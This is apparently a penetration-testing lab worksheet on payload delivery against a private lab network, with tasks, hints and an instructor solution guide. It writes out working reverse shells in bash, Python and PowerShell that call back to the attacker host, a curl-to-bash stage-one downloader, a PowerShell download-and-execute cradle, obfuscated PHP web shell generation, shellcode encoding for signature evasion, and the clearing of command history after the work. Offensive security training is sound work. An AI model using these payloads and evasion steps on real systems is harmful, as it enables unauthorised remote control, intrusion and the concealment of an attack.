# Lab 04: Payload Delivery

A hands-on exercise in payload generation, encoding, and delivery techniques.

## Lab Information

| Attribute | Value |
|-----------|-------|
| Difficulty | Intermediate to Advanced |
| Time Estimate | 90-120 minutes |
| Prerequisites | Labs 01-03 completed, Payload Generator Walkthrough |
| Tools Required | payload-generator, shellcode-encoder, reverse-shell-handler |

---

## Objective

Generate appropriate payloads for different target environments, apply encoding techniques, and establish reverse shell connections through various delivery methods.

---

## Environment Setup

### Lab Network

```
Network: 10.10.10.0/24
Your IP: 10.10.14.5 (attacker machine)

Targets:
- 10.10.10.20 (Linux Web Server - PHP)
- 10.10.10.50 (Linux Workstation - Python)
- 10.10.10.60 (Windows Workstation - PowerShell)
```

### Assumptions

- You have command execution on targets (via vulnerability or valid credentials)
- Targets can reach your machine on ports 4444, 443, 8080
- PHP is available on web server
- Python 3 on Linux workstation
- PowerShell on Windows workstation

---

## Scenario

You have discovered command injection vulnerabilities and valid credentials during your assessment. Now you need to establish persistent shell access to continue the engagement. Practice generating and delivering payloads appropriate for each target.

---

## Tasks

### Task 1: Basic Reverse Shell Generation (Level 1 - Foundation)

**Objective**: Generate reverse shells for each target platform.

**Instructions**:

1. Generate a bash reverse shell:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost 10.10.14.5 \
    --lport 4444 \
    --plan
```

```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost 10.10.14.5 \
    --lport 4444
```

2. Generate a Python reverse shell:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang python \
    --lhost 10.10.14.5 \
    --lport 4444
```

3. Generate a PowerShell reverse shell:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --lport 4444
```

4. Save each payload to a file.

**Deliverable**: Three reverse shell payloads (bash, python, powershell)

---

### Task 2: Handler Setup (Level 1 - Foundation)

**Objective**: Set up shell handlers to receive connections.

**Instructions**:

1. Start a basic handler:
```bash
python3 /path/to/reverse-shell-handler/tool.py \
    -l 4444 \
    --plan
```

```bash
python3 /path/to/reverse-shell-handler/tool.py -l 4444
```

2. In a new terminal, test with a local connection:
```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

3. Verify you receive the connection.

**Deliverable**: Screenshot/output showing successful handler connection

---

### Task 3: Encoded Payload Generation (Level 2 - Application)

**Objective**: Generate encoded payloads for delivery via command line.

**Instructions**:

1. Generate base64-encoded bash payload:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost 10.10.14.5 \
    --lport 4444 \
    --encoding base64
```

2. Create the execution command:
```bash
echo "<base64_payload>" | base64 -d | bash
```

3. Generate base64-encoded PowerShell:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --encoding base64
```

4. Create the execution command:
```powershell
powershell -enc <base64_payload>
```

**Deliverable**: Encoded payloads with execution commands

---

### Task 4: Web Shell Generation (Level 2 - Application)

**Objective**: Generate web shells for persistent web access.

**Instructions**:

1. Generate a PHP web shell:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type web_shell \
    --lang php \
    --plan
```

```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type web_shell \
    --lang php > webshell.php
```

2. Generate an obfuscated version:
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type web_shell \
    --lang php \
    --obfuscate 2 > webshell_obf.php
```

3. Document usage method for each shell.

**Deliverable**: Web shell files with usage documentation

---

### Task 5: Shellcode Encoding (Level 3 - Integration)

**Objective**: Encode shellcode to evade signature detection.

**Instructions**:

1. Assume you have raw shellcode in shellcode.bin. Analyze it:
```bash
python3 /path/to/shellcode-encoder/shellcode_encoder.py \
    --input shellcode.bin \
    --analyze
```

2. Apply XOR encoding:
```bash
python3 /path/to/shellcode-encoder/shellcode_encoder.py \
    --input shellcode.bin \
    --encoding xor \
    --format python \
    --output encoded_xor.py
```

3. Apply chain encoding for stronger evasion:
```bash
python3 /path/to/shellcode-encoder/shellcode_encoder.py \
    --input shellcode.bin \
    --chain xor,add,rot \
    --null-free \
    --format csharp \
    --output encoded_chain.cs
```

4. Compare file sizes and analyze effectiveness.

**Deliverable**: Multiple encoded shellcode versions with analysis

---

### Task 6: Multi-Stage Payload Design (Level 3 - Integration)

**Objective**: Design a multi-stage payload delivery system.

**Instructions**:

Design a payload that:
1. Stage 1: Small downloader payload delivered via command injection
2. Stage 2: Full reverse shell downloaded and executed

**Stage 1 Design** (Bash):
```bash
# Small payload to download and execute stage 2
curl http://10.10.14.5:8080/stage2.sh | bash
```

**Stage 2** (Full reverse shell):
```bash
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost 10.10.14.5 \
    --lport 4444 > stage2.sh
```

**Delivery Setup**:
```bash
# Terminal 1: Web server for stage 2
python3 -m http.server 8080

# Terminal 2: Handler for shell
python3 /path/to/reverse-shell-handler/tool.py -l 4444

# Inject stage 1 via command injection
```

**Deliverable**: Multi-stage payload documentation and files

---

### Task 7: Platform-Specific Payload Selection (Level 3 - Integration)

**Objective**: Select appropriate payloads based on target reconnaissance.

**Instructions**:

Given the following target information, select and generate appropriate payloads:

**Target A** (10.10.10.20):
- Apache 2.4 with PHP 7.4
- Linux Ubuntu 20.04
- Web application with file upload vulnerability
- Outbound filtering: Only HTTP/HTTPS allowed

**Target B** (10.10.10.50):
- Linux server with SSH access (valid creds: backup:backup123)
- Python 3 installed
- No outbound filtering

**Target C** (10.10.10.60):
- Windows 10 workstation
- PowerShell available
- Antivirus present
- Outbound filtering: Only 443 allowed

For each target:
1. Document your payload choice and reasoning
2. Generate the payload
3. Document the delivery method

**Deliverable**: Target-specific payload strategy document

---

## Challenge Tasks (Level 4 - Mastery)

### Challenge 1: Firewall Evasion

Target has strict outbound filtering allowing only DNS (53) and HTTPS (443). Design a payload that:
- Uses port 443 for callback
- Optionally uses DNS for exfiltration

### Challenge 2: Living-off-the-Land

Create a payload chain using only built-in Windows utilities (no dropping files):
- certutil for download
- PowerShell for execution
- All in memory

### Challenge 3: Payload Automation

Write a script that:
1. Takes target IP and detected platform as input
2. Automatically selects appropriate payload
3. Generates encoded payload
4. Starts handler
5. Outputs delivery command

---

## Hints

<details>
<summary>Hint 1: Handler Not Receiving Connection</summary>

Check:
- Firewall on your machine allows inbound on handler port
- Target can reach your IP (network routing)
- Payload has correct LHOST/LPORT
```bash
# Test listener is working
nc -lvnp 4444
```
</details>

<details>
<summary>Hint 2: PowerShell Payload Not Executing</summary>

Windows execution policy may block scripts:
```powershell
powershell -ExecutionPolicy Bypass -enc <payload>
```

Or use download cradle:
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```
</details>

<details>
<summary>Hint 3: Base64 Encoding Issues</summary>

PowerShell uses UTF-16LE encoding for -enc parameter:
```bash
# Ensure proper encoding
echo -n "<payload>" | iconv -t UTF-16LE | base64 -w0
```
</details>

<details>
<summary>Hint 4: Shell Dies Immediately</summary>

Upgrade to stable shell:
```bash
# On target
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
</details>

<details>
<summary>Hint 5: Web Shell Detected</summary>

Try higher obfuscation level or alternative execution methods:
```bash
python3 payload_generator.py --type web_shell --lang php --obfuscate 3
```
</details>

---

## Solution Guide

<details>
<summary>Click to reveal solution (Instructor Use)</summary>

### Task 1 Solution

**Bash:**
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

**Python:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**PowerShell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Task 7 Solution

**Target A Strategy:**
- Payload: PHP reverse shell
- Port: 443 (outbound allowed)
- Delivery: File upload vulnerability
- Obfuscation: Level 2

**Target B Strategy:**
- Payload: Python reverse shell
- Port: 4444 (no filtering)
- Delivery: SSH + command execution
- No obfuscation needed

**Target C Strategy:**
- Payload: PowerShell reverse shell
- Port: 443 (only allowed outbound)
- Delivery: via valid creds or other vector
- Obfuscation: Level 3 (AV present)
- Consider: AMSI bypass if needed

</details>

---

## Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Basic Payload Generation | 15 | All platforms covered |
| Handler Setup | 10 | Successful connection |
| Encoded Payloads | 20 | Correct encoding applied |
| Web Shell Creation | 15 | Functional shells |
| Shellcode Encoding | 20 | Multiple encoding methods |
| Platform-Specific Selection | 20 | Appropriate choices |

**Total: 100 points**

---

## Operational Security Notes

### Payload Storage

- Never store plaintext payloads on production systems
- Use encryption for stored payloads
- Clean up after engagement

### Handler Security

- Use SSL/TLS when possible
- Consider callback verification
- Limit handler exposure time

### Avoiding Detection

- Test payloads in isolated environment first
- Use appropriate obfuscation for target
- Minimize payload size
- Avoid known signatures

---

## Cleanup

```bash
# Remove payload files
rm -f *.php *.py *.ps1 *.sh *.bin

# Kill any running handlers
pkill -f reverse-shell-handler

# Clear command history if needed
history -c
```

---

## Next Lab

Proceed to **Lab 05: Evasion Techniques** to learn how to evade security controls during payload execution.
